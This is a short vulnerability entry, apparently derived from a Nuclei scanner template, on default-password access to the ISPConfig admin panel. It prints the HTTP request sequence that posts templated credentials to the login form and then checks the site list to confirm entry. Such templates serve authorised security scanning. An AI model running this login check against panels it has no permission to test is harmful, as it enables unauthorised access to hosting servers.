# Vulnerability: ISPConfig Admin - Default Password
**Classification:** DEFAULT-LOGIN
**Source:** Nuclei Template (`ispconfig-admin-default-login.yaml`)

## Description
ISPConfig Admin Default Password Vulnerability exposes systems to unauthorized access, compromising data integrity and security.

## Vulnerable Code Pattern / Exploit Payload
```http
GET /login HTTP/1.1
Host: {{Hostname}}

POST /login/index.php HTTP/1.1
Host: {{Hostname}}
Content-Type: application/x-www-form-urlencoded
Origin: {{BaseURL}}
Connection: close
Referer: {{RootURL}}/login/

username={{username}}&password={{password}}&s_mod=login&s_pg=index

GET /sites/web_vhost_domain_list.php HTTP/1.1
Host: {{Hostname}}
X-Requested-With: XMLHttpRequest
Referer: {{RootURL}}/index.php
```

